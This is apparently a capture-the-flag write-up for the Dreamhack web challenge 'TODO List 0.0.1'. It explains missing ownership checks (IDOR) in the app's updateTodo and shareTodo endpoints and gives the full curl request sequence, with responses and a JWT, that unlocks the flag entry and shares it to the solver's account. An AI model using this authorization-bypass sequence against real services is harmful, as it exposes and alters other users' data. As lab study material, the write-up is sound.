---
title: "Dreamhack: TODO List 0.0.1"
date: 2025-08-12
tags:
  - web
  - ctf
  - vuejs
  - idor
draft: false
---
##### Link : [TODO List 0.0.1](https://dreamhack.io/wargame/challenges/1533)

##### Description
```
null
```

##### Solve

The index page shows "Login" and "Sign Up" buttons.

![[Pasted image 20250812131458.png]]

The "Sign Up" page takes username/email/password.

![[Pasted image 20250812131551.png]]

The "Login" page takes email/password.

![[Pasted image 20250812131637.png]]

First I signed up with a test account.

![[Pasted image 20250812131741.png]]

With the created account, I signed in, and encounter the following page.

![[Pasted image 20250812131808.png]]

When I click "+Add Todo" button, the input takes title/description/date.

![[Pasted image 20250812131849.png]]

Let's analyze its source code now.

`deploy/create.sql` :
```sql
...

INSERT INTO Todo (todo_list_id, title, description, is_completed) VALUES (
	1,
	'flag',
	'DH{sample_flag}',
	1
);
```

The table `Todo` contains flag as its entry.

`pages/index.vue` :
```js
...

  <!--
  under construction 
  <button @click="shareTodo"> Share </button>
  -->
  
...
```

The button `shareTodo` is commented out with the comment "Under construction".
This might be a hint.

`server/api/shareTodo.js` :
```js
...

const todo_data = await db.get(
	'SELECT * FROM Todo WHERE id = ?', [todo.id]
);
if (todo_data.is_completed === 1) {
	return { message: 'you cannot share already completed todo', id: todo_data.id}
}

const result = await db.run(
	`INSERT INTO TodoShares (todo_id, user_id, permission_type) VALUES
	(?, ?, ?)`,
[todo_data.id, todo.target_id, 'shared']
);

return { success: true, message: 'Todo shared successfully', id: result.lastID };
```

When executing the query `SELECT * FROM Todo WHERE id = ?` to retrieve `todo_data`, the logic doesn't check if the inserted `todo.id` is same with the owner of the `todo_data`.

At least, it checks if the task is completed while the flag entry is marked as complted.

So basically, the flag entry cannot be shared without any update.

`server/api/updateTodo.js` :
```js
...

const result = await db.run(
	`UPDATE todo
	SET is_completed = ?
	WHERE id = ?`,
	[value, id]
);

return { success: true, message: 'Todo updated successfully', id: result.lastID };

...
```

The update logic also doesn't check if the user is authorized to update the entry.

Overall, with all the information I got from the reconnaissance, I got into the following plan.
- Sign up with mock account.
- Call `updateTodo` to update the flag entry's `is_completed` field.
- Call `shareTodo` to share the flag entry to our user.

First, I did sign up and sign in with the account. Then I could achieve JWT token.

```bash
% curl -s -v -X POST "http://host1.dreamhack.games:16867/api/signup" \ 
  -H "Content-Type: application/json" \
  -d '{"username": "hacker", "email": "hacker@hack.com", "password": "password123"}'
  
* Host host1.dreamhack.games:16867 was resolved.
* IPv6: (none)
* IPv4: 139.99.121.66
*   Trying 139.99.121.66:16867...
* Connected to host1.dreamhack.games (139.99.121.66) port 16867
> POST /api/signup HTTP/1.1
> Host: host1.dreamhack.games:16867
> User-Agent: curl/8.5.0
> Accept: */*
> Content-Type: application/json
> Content-Length: 77
> 
< HTTP/1.1 200 OK
< content-type: application/json
< date: Tue, 12 Aug 2025 04:44:39 GMT
< connection: close
< content-length: 63
< 

{
  "message": "User registered successfully.",
  "userId": 3
* Closing connection
}%
```

```bash
% curl -v -X POST "http://host1.dreamhack.games:16867/api/login" \
  -H "Content-Type: application/json" \
  -d '{"email": "hacker@hack.com", "password": "password123"}'

Note: Unnecessary use of -X or --request, POST is already inferred.
* Host host1.dreamhack.games:16867 was resolved.
* IPv6: (none)
* IPv4: 139.99.121.66
*   Trying 139.99.121.66:16867...
* Connected to host1.dreamhack.games (139.99.121.66) port 16867
> POST /api/login HTTP/1.1
> Host: host1.dreamhack.games:16867
> User-Agent: curl/8.5.0
> Accept: */*
> Content-Type: application/json
> Content-Length: 55
> 
< HTTP/1.1 200 OK
< content-type: application/json
< date: Tue, 12 Aug 2025 04:46:39 GMT
< connection: close
< content-length: 228
< 

{
  "message": "Login successful!",
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjMsImVtYWlsIjoiaGFja2VyQGhhY2suY29tIiwiaWF0IjoxNzU0OTczOTk5LCJleHAiOjE3NTQ5ODQ3OTl9.NJXIbcEQoCG3bC1wgpHXaxRI_WfArgAAx5iYvx5sYU0"
* Closing connection
}%
```

![[Pasted image 20250812133309.png]]

Now, let's call `/api/updateTodo` to trigger IDOR with `id=1` and `value=0`.

```bash
% curl -v -X POST "http://host1.dreamhack.games:16867/api/updateTodo" \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjMsImVtYWlsIjoiaGFja2VyQGhhY2suY29tIiwiaWF0IjoxNzU0OTczOTk5LCJleHAiOjE3NTQ5ODQ3OTl9.NJXIbcEQoCG3bC1wgpHXaxRI_WfArgAAx5iYvx5sYU0" \
  -H "Content-Type: application/json" \
  -d '{"id": 1, "value": 0}'

Note: Unnecessary use of -X or --request, POST is already inferred.
* Host host1.dreamhack.games:16867 was resolved.
* IPv6: (none)
* IPv4: 139.99.121.66
*   Trying 139.99.121.66:16867...
* Connected to host1.dreamhack.games (139.99.121.66) port 16867
> POST /api/updateTodo HTTP/1.1
> Host: host1.dreamhack.games:16867
> User-Agent: curl/8.5.0
> Accept: */*
> Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjMsImVtYWlsIjoiaGFja2VyQGhhY2suY29tIiwiaWF0IjoxNzU0OTczOTk5LCJleHAiOjE3NTQ5ODQ3OTl9.NJXIbcEQoCG3bC1wgpHXaxRI_WfArgAAx5iYvx5sYU0
> Content-Type: application/json
> Content-Length: 21
> 
< HTTP/1.1 200 OK
< content-type: application/json
< date: Tue, 12 Aug 2025 04:48:10 GMT
< connection: close
< content-length: 74
< 
{
  "success": true,
  "message": "Todo updated successfully",
  "id": 0
* Closing connection
}
```

Now, I can bypass the `is_completed==1` filter, and share the flag entry to our account.

```bash
% curl -v -X POST "http://host1.dreamhack.games:16867/api/shareTodo" \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjMsImVtYWlsIjoiaGFja2VyQGhhY2suY29tIiwiaWF0IjoxNzU0OTczOTk5LCJleHAiOjE3NTQ5ODQ3OTl9.NJXIbcEQoCG3bC1wgpHXaxRI_WfArgAAx5iYvx5sYU0" \
  -H "Content-Type: application/json" \
  -d '{"id": 1, "target_id": 2}'

Note: Unnecessary use of -X or --request, POST is already inferred.
* Host host1.dreamhack.games:16867 was resolved.
* IPv6: (none)
* IPv4: 139.99.121.66
*   Trying 139.99.121.66:16867...
* Connected to host1.dreamhack.games (139.99.121.66) port 16867
> POST /api/shareTodo HTTP/1.1
> Host: host1.dreamhack.games:16867
> User-Agent: curl/8.5.0
> Accept: */*
> Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjMsImVtYWlsIjoiaGFja2VyQGhhY2suY29tIiwiaWF0IjoxNzU0OTczOTk5LCJleHAiOjE3NTQ5ODQ3OTl9.NJXIbcEQoCG3bC1wgpHXaxRI_WfArgAAx5iYvx5sYU0
> Content-Type: application/json
> Content-Length: 25
> 
< HTTP/1.1 200 OK
< content-type: application/json
< date: Tue, 12 Aug 2025 04:49:38 GMT
< connection: close
< content-length: 73
< 
{
  "success": true,
  "message": "Todo shared successfully",
  "id": 1
* Closing connection
}
```

After this, when I sign in again on browser, I can find the flag.

![[Pasted image 20250812135053.png]]